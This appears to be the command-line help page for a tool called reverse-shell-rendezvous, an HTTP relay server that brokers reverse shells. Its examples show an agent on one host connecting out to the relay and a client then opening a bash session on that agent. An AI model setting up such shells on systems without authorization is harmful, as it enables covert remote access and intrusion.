## reverse-shell-rendezvous

An http server listening for agents and clients

### Synopsis

The rendezvous is an http server listening for agents and clients.	It can run behind a reverse-proxy and that reverse-proxy could to SSL offloading.

```
reverse-shell-rendezvous [flags]
```

### Examples

```
Start the rendezvous and the agent:
# On the rendezvous (1.2.3.4)
$ rendezvous -P 7777

# On the agent (3.4.5.6)
$ agent websocket -U http://1.2.3.4:7777

Open a shell and send some commands
# List the agents
$ ./client list-agents -U http://1.2.3.4:7777
List of agents:
* 3.4.5.6:65000

# Create a session
$ client create -U http://1.2.3.4:7777 3.4.5.6:65000
Attaching to admiring_meitn
Connected to admiring_meitn
bash-3.2$

```

### Options

```
  -h, --help          help for reverse-shell-rendezvous
      --port int32    remote port to connect to (default 8080)
  -v, --verbose int   Be verbose on log output
```

